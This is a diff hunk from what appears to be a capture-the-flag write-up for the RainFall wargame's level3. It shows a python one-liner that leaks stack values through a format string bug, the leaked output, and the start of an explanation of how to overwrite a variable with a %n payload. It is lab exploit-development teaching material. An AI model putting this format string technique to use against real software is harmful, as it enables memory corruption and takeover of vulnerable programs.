@@ -42,7 +42,7 @@ We use **gdb**'s "info variables" to get its memaddress: **0x0804988c**
 level3@RainFall:~$ python -c 'print "AAAA" + " %p" * 10' | ./level3
 AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
 ~~~
-**0x41414141** is our "AAAA" input - AAAA is 41414141 in hex.
+**0x41414141** is our "AAAA" input - AAAA is 41414141 in hex - on position number 4.
 
 **Step 2**: We will craft the payload using **%[number]$n** formatter to precisely target the memory position. Variable m needs to be 64 bytes. Its memory address has four, so we add 60 bytes of stuff + the modifier. Like so:
 ~~~Shell
